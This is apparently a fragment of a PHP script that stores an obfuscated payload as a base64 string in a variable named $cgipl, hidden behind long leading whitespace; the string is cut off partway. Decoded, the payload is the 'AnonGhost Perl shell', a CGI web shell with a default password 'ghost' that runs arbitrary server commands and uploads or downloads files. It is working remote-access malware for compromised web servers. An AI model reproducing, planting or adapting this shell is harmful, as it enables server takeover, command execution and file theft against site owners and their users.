                                                                            $cgipl = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWFpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyA8YiBzdHlsZT0iY29sb3I6YmxhY2s7YmFja2dyb3VuZC1jb2xvcjojZmZmZjY2Ij5Bbm9uR2hvc3QgUGVybCBzaGVsbDwvYj4gIyBzZXJ2ZXINCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBDb25maWd1cmF0aW9uOiBZb3UgbmVlZCB0byBjaGFuZ2Ugb25seSAkUGFzc3dvcmQgYW5kICRXaW5OVC4gVGhlIG90aGVyDQojIHZhbHVlcyBzaG91bGQgd29yayBmaW5lIGZvciBtb3N0IHN5c3RlbXMuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQokUGFzc3dvcmQgPSAiZ2hvc3QiOwkJIyBDaGFuZ2UgdGhpcy4gWW91IHdpbGwgbmVlZCB0byBlbnRlciB0aGlzDQoJCQkJIyB0byBsb2dpbi4NCg0KJFdpbk5UID0gMDsJCQkjIFlvdSBuZWVkIHRvIGNoYW5nZSB0aGUgdmFsdWUgb2YgdGhpcyB0byAxIGlmDQoJCQkJIyB5b3UncmUgcnVubmluZyB0aGlzIHNjcmlwdCBvbiBhIFdpbmRvd3MgTlQNCgkJCQkjIG1hY2hpbmUuIElmIHlvdSdyZSBydW5uaW5nIGl0IG9uIFVuaXgsIHlvdQ0KCQkJCSMgY2FuIGxlYXZlIHRoZSB2YWx1ZSBhcyBpdCBpcy4NCg0KJE5UQ21kU2VwID0gIiYiOwkJIyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMNCgkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFdpbmRvd3MgTlQuDQoNCiRVbml4Q21kU2VwID0gIjsiOwkJIyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMNCgkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFVuaXguDQoNCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMTA7CSMgVGltZSBpbiBzZWNvbmRzIGFmdGVyIGNvbW1hbmRzIHdpbGwgYmUga2lsbGVkDQoJCQkJIyBEb24ndCBzZXQgdGhpcyB0byBhIHZlcnkgbGFyZ2UgdmFsdWUuIFRoaXMgaXMNCgkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0DQoJCQkJIyB0YWtlIHZlcnkgbG9uZyB0byBleGVjdXRlLCBsaWtlICJmaW5kIC8iLg0KCQkJCSMgVGhpcyBpcyB2YWxpZCBvbmx5IG9uIFVuaXggc2VydmVycy4gSXQgaXMNCgkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4NCg0KJFNob3dEeW5hbWljT3V0cHV0ID0gMTsJCSMgSWYgdGhpcyBpcyAxLCB0aGVuIGRhdGEgaXMgc2VudCB0byB0aGUNCgkJCQkjIGJyb3dzZXIgYXMgc29vbiBhcyBpdCBpcyBvdXRwdXQsIG90aGVyd2lzZQ0KCQkJCSMgaXQgaXMgYnVmZmVyZWQgYW5kIHNlbmQgd2hlbiB0aGUgY29tbWFuZA0KCQkJCSMgY29tcGxldGVzLiBUaGlzIGlzIHVzZWZ1bCBmb3IgY29tbWFuZHMgbGlrZQ0KCQkJCSMgcGluZywgc28gdGhhdCB5b3UgY2FuIHNlZSB0aGUgb3V0cHV0IGFzIGl0DQoJCQkJIyBpcyBiZWluZyBnZW5lcmF0ZWQuDQoNCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISENCg0KJENtZFNlcCA9ICgkV2luTlQgPyAkTlRDbWRTZXAgOiAkVW5peENtZFNlcCk7DQokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7DQokUGF0aFNlcCA9ICgkV2luTlQgPyAiXFwiIDogIi8iKTsNCiRSZWRpcmVjdG9yID0gKCRXaW5OVCA/ICIgMj4mMSAxPiYyIiA6ICIgMT4mMSAyPiYxIik7DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUmVhZHMgdGhlIGlucHV0IHNlbnQgYnkgdGhlIGJyb3dzZXIgYW5kIHBhcnNlcyB0aGUgaW5wdXQgdmFyaWFibGVzLiBJdA0KIyBwYXJzZXMgR0VULCBQT1NUIGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVzLg0KIyBUaGUgZmlsZW5hbWUgaXMgc3RvcmVkIGluICRpbnsnZid9IGFuZCB0aGUgZGF0YSBpcyBzdG9yZWQgaW4gJGlueydmaWxlZGF0YSd9Lg0KIyBPdGhlciB2YXJpYWJsZXMgY2FuIGJlIGFjY2Vzc2VkIHVzaW5nICRpbnsndmFyJ30sIHdoZXJlIHZhciBpcyB0aGUgbmFtZSBvZg0KIyB0aGUgdmFyaWFibGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9tIG90aGVyIENHSQ0KIyBzY3JpcHRzLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFJlYWRQYXJzZSANCnsNCglsb2NhbCAoKmluKSA9IEBfIGlmIEBfOw0KCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7DQoJDQoJJE11bHRpcGFydEZvcm1EYXRhID0gJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC87DQoNCglpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJHRVQiKQ0KCXsNCgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307DQoJfQ0KCWVsc2lmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIlBPU1QiKQ0KCXsNCgkJYmlubW9kZShTVERJTikgaWYgJE11bHRpcGFydEZvcm1EYXRhICYgJFdpbk5UOw0KCQlyZWFkKFNURElOLCAkaW4sICRFTlZ7J0NPTlRFTlRfTEVOR1RIJ30pOw0KCX0NCg0KCSMgaGFuZGxlIGZpbGUgdXBsb2FkIGRhdGENCglpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykNCgl7DQoJCSRCb3VuZGFyeSA9ICctLScuJDE7ICMgcGxlYXNlIHJlZmVyIHRvIFJGQzE4NjcgDQoJCUBsaXN0ID0gc3BsaXQoLyRCb3VuZGFyeS8sICRpbik7IA0KCQkkSGVhZGVyQm9keSA9ICRsaXN0WzFdOw0KCQkkSGVhZGVyQm9keSA9fiAvXHJcblxyXG58XG5cbi87DQoJCSRIZWFkZXIgPSAkYDsNCgkJJEJvZHkgPSAkJzsNCiAJCSRCb2R5ID1+IHMvXHJcbiQvLzsgIyB0aGUgbGFzdCBcclxuIHdhcyBwdXQgaW4gYnkgTmV0c2NhcGUNCgkJJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7DQoJCSRIZWFkZXIgPX4gL2ZpbGVuYW1lPVwiKC4rKVwiLzsgDQoJCSRpbnsnZid9ID0gJDE7IA0KCQkkaW57J2YnfSA9fiBzL1wiLy9nOw0KCQkkaW57J2YnfSA9fiBzL1xzLy9nOw0KDQoJCSMgcGFyc2UgdHJhaWxlcg0KCQlmb3IoJGk9MjsgJGxpc3RbJGldOyAkaSsrKQ0KCQl7IA0KCQkJJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87DQoJCQkkbGlzdFskaV0gPX4gL1wiKFx3KylcIi87DQoJCQkka2V5ID0gJDE7DQoJCQkkdmFsID0gJCc7DQoJCQkkdmFsID1+IHMvKF4oXHJcblxyXG58XG5cbikpfChcclxuJHxcbiQpLy9nOw0KCQkJJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSRpbnska2V5fSA9ICR2YWw7IA0KCQl9DQoJfQ0KCWVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQ0KCXsNCgkJQGluID0gc3BsaXQoLyYvLCAkaW4pOw0KCQlmb3JlYWNoICRpICgwIC4uICQjaW4pDQoJCXsNCgkJCSRpblskaV0gPX4gcy9cKy8gL2c7DQoJCQkoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOw0KCQkJJGtleSA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsNCgkJCSRpbnska2V5fSAuPSAkdmFsOw0KCQl9DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBQYWdlIEhlYWRlcg0KIyBBcmd1bWVudCAxOiBGb3JtIGl0ZW0gbmFtZSB0byB3aGljaCBmb2N1cyBzaG91bGQgYmUgc2V0DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRQYWdlSGVhZGVyDQp7DQoJJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7DQoJJEVuY29kZWRDdXJyZW50RGlyID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsNCglwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCglwcmludCA8PEVORDsNCjxodG1sPg0KPGhlYWQ+DQo8dGl0bGU+QW5vbkdob3N0IFBlcmwgc2hlbGw8L3RpdGxlPg0KJEh0bWxNZXRhSGVhZGVyDQoNCjxtZXRhIG5hbWU9ImtleXdvcmRzIiBjb250ZW50PSJBbm9uR2hvc3QsQW5vbkdob3N0LEFub25HaG9zdC5pbmZvLGhhY2tlciI+DQo8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iQW5vbkdob3N0LEFub25HaG9zdCxBbm9uR2hvc3QuaW5mbyxoYWNrZXIiPg0KPC9oZWFkPg0KPGJvZHkgb25Mb2FkPSJkb2N1bWVudC5mLkBfLmZvY3VzKCkiIGJnY29sb3I9IiNGRkZGRkYiIHRvcG1hcmdpbj0iMCIgbGVmdG1hcmdpbj0iMCIgbWFyZ2lud2lkdGg9IjAiIG1hcmdpbmhlaWdodD0iMCIgdGV4dD0iI0ZGMDAwMCI+DQo8dGFibGUgYm9yZGVyPSIxIiB3aWR0aD0iMTAwJSIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIyIj4NCjx0cj4NCjx0ZCBiZ2NvbG9yPSIjRkZGRkZGIiBib3JkZXJjb2xvcj0iI0ZGRkZGRiIgYWxpZ249ImNlbnRlciIgd2lkdGg9IjElIj4NCjxiPjxmb250IHNpemU9IjIiPiM8L2ZvbnQ+PC9iPjwvdGQ+DQo8dGQgYmdjb2xvcj0iI0ZGRkZGRiIgd2lkdGg9Ijk4JSI+PGZvbnQgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+PGI+IA0KPGIgc3R5bGU9ImNvbG9yOmJsYWNrO2JhY2tncm91bmQtY29sb3I6I2ZmZmY2NiI+QW5vbkdob3N0IFBlcmwgc2hlbGw8L2I+IENvbm5lY3RlZCB0byAkU2VydmVyTmFtZTwvYj48L2ZvbnQ+PC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQgY29sc3Bhbj0iMiIgYmdjb2xvcj0iI0ZGRkZGRiI+PGZvbnQgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+DQoNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPXVwbG9hZCZkPSRFbmNvZGVkQ3VycmVudERpciI+PGZvbnQgY29sb3I9IiNGRjAwMDAiPlVwbG9hZCBGaWxlPC9mb250PjwvYT4gfCANCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+RG93bmxvYWQgRmlsZTwvZm9udD48L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWxvZ291dCI+PGZvbnQgY29sb3I9IiNGRjAwMDAiPkRpc2Nvbm5lY3Q8L2ZvbnQ+PC9hPiB8DQo8L2ZvbnQ+PC90ZD4NCjwvdHI+DQo8L3RhYmxlPg0KPGZvbnQgc2l6ZT0iMyI+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5TY3JlZW4NCnsNCgkkTWVzc2FnZSA9IHEkPHByZT48aW1nIGJvcmRlcj0iMCIgc3JjPSJodHRwOi8vaW1nODEwLmltYWdlc2hhY2sudXMvaW1nODEwLzgwNDMvQW5vbkdob3N0MTIucG5nIj48L3ByZT48YnI+PGJyPjwvZm9udD48aDE+RGVmYXVsdCBQYXNzd29yZD1naG9zdDwvaDE+DQokOw0KIycNCglwcmludCA8PEVORDsNCjxjb2RlPg0KDQpUcnlpbmcgJFNlcnZlck5hbWUuLi48YnI+DQpDb25uZWN0ZWQgdG8gJFNlcnZlck5hbWU8YnI+DQpFc2NhcGUgY2hhcmFjdGVyIGlzIF5dDQo8Y29kZT4kTWVzc2FnZQ0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBtZXNzYWdlIHRoYXQgaW5mb3JtcyB0aGUgdXNlciBvZiBhIGZhaWxlZCBsb2dpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5GYWlsZWRNZXNzYWdlDQp7DQoJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxicj5sb2dpbjogYWRtaW48YnI+DQpwYXNzd29yZDo8YnI+DQpMb2dpbiBpbmNvcnJlY3Q8YnI+PGJyPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gZm9yIGxvZ2dpbmcgaW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRm9ybQ0Kew0KCXByaW50IDw8RU5EOw0KPGNvZGU+DQoNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImxvZ2luIj4NCjwvZm9udD4NCjxmb250IHNpemU9IjMiPg0KbG9naW46IDxiIHN0eWxlPSJjb2xvcjpibGFjaztiYWNrZ3JvdW5kLWNvbG9yOiNmZmZmNjYiPkFub25HaG9zdCBQZXJsIHNoZWxsPC9iPjxicj4NCnBhc3N3b3JkOjwvZm9udD48Zm9udCBjb2xvcj0iIzAwOTkwMCIgc2l6ZT0iMyI+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQo8L2Zvcm0+DQo8L2NvZGU+DQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIGZvb3RlciBmb3IgdGhlIEhUTUwgUGFnZQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUZvb3Rlcg0Kew0KCXByaW50ICI8L2ZvbnQ+PC9ib2R5PjwvaHRtbD4iOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFJldHJlaXZlcyB0aGUgdmFsdWVzIG9mIGFsbCBjb29raWVzLiBUaGUgY29va2llcyBjYW4gYmUgYWNjZXNzZXMgdXNpbmcgdGhlDQojIHZhcmlhYmxlICRDb29raWVzeycnfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEdldENvb2tpZXMNCnsNCglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOw0KCWZvcmVhY2ggJGNvb2tpZShAaHR0cGNvb2tpZXMpDQoJew0KCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7DQoJCSRDb29raWVzeyRpZH0gPSAkdmFsOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dvdXRTY3JlZW4NCnsNCglwcmludCAiPGNvZGU+Q29ubmVjdGlvbiBjbG9zZWQgYnkgZm9yZWlnbiBob3N0Ljxicj48YnI+PC9jb2RlPiI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgTG9ncyBvdXQgdGhlIHVzZXIgYW5kIGFsbG93cyB0aGUgdXNlciB0byBsb2dpbiBhZ2Fpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFBlcmZvcm1Mb2dvdXQNCnsNCglwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9O1xuIjsgIyByZW1vdmUgcGFzc3dvcmQgY29va2llDQoJJlByaW50UGFnZUhlYWRlcigicCIpOw0KCSZQcmludExvZ291dFNjcmVlbjsNCg0KCSZQcmludExvZ2luU2NyZWVuOw0KCSZQcmludExvZ2luRm9ybTsNCgkmUHJpbnRQYWdlRm9vdGVyOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGxvZ2luIHRoZSB1c2VyLiBJZiB0aGUgcGFzc3dvcmQgbWF0Y2hlcywgaXQNCiMgZGlzcGxheXMgYSBwYWdlIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3JkIGRvZW5zJ3QNCiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyDQojIHRvIGxvZ2luDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ2luIA0Kew0KCWlmKCRMb2dpblBhc3N3b3JkIGVxICRQYXNzd29yZCkgIyBwYXNzd29yZCBtYXRjaGVkDQoJew0KCQlwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9JExvZ2luUGFzc3dvcmQ7XG4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCX0NCgllbHNlICMgcGFzc3dvcmQgZGlkbid0IG1hdGNoDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7DQoJCSZQcmludExvZ2luU2NyZWVuOw0KCQlpZigkTG9naW5QYXNzd29yZCBuZSAiIikgIyBzb21lIHBhc3N3b3JkIHdhcyBlbnRlcmVkDQoJCXsNCgkJCSZQcmludExvZ2luRmFpbGVkTWVzc2FnZTsNCg0KCQl9DQoJCSZQcmludExvZ2luRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gZW50ZXIgY29tbWFuZHMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtDQp7DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQoJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCiRQcm9tcHQNCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjIj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQo8L2Zvcm0+DQo8L2NvZGU+DQoNCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGRvd25sb2FkIGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlRG93bmxvYWRGb3JtDQp7DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQoJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+DQokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpEb3dubG9hZDogPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCjwvZm9ybT4NCjwvY29kZT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHVwbG9hZCBmaWxlcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50RmlsZVVwbG9hZEZvcm0NCnsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCglwcmludCA8PEVORDsNCjxjb2RlPg0KDQo8Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCiRQcm9tcHQgdXBsb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpPcHRpb25zOiAmbmJzcDs8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIHZhbHVlPSJvdmVyd3JpdGUiPg0KT3ZlcndyaXRlIGlmIGl0IEV4aXN0czxicj48YnI+DQpVcGxvYWQ6Jm5ic3A7Jm5ic3A7Jm5ic3A7PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0idXBsb2FkIj4NCjwvZm9ybT4NCjwvY29kZT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY